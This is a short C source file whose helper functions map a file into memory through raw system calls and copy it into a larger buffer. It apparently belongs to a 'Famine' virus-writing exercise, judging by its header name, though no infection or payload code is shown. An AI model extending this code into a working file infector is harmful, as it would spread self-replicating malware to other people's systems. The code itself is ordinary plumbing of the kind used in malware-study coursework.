#include "map.h"
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <errno.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include "famine.h"
#include "utils.h"

uint8_t	*map_file(const char *filename, size_t *size) {
	int		fd;
	uint8_t	*file;
	ssize_t	ret;
	struct stat st;

	fd = _syscall(SYS_open, filename, O_RDONLY);

	if (_syscall(SYS_fstat, fd, &st) == -1) {
		_syscall(SYS_close, fd);
		return NULL;
	}

	file = (uint8_t *)_syscall(SYS_mmap, NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (file == MAP_FAILED) {
		_syscall(SYS_close, fd);
		return NULL;
	}

	_syscall(SYS_close, fd);

	*size = st.st_size;

	return file;
}

uint8_t	*expand_file(uint8_t *file, size_t size, size_t new_size, t_data *data) {
	uint8_t	*new_file;

	new_file = (uint8_t *)_syscall(SYS_mmap, NULL, new_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	if (new_file == MAP_FAILED) {
		return NULL;
	}
	ft_memset(new_file, 0, new_size);
	ft_memcpy(new_file, file, size);


	_syscall(SYS_munmap, file, size);

	init_data(data, new_file, new_size);

	return new_file;
}
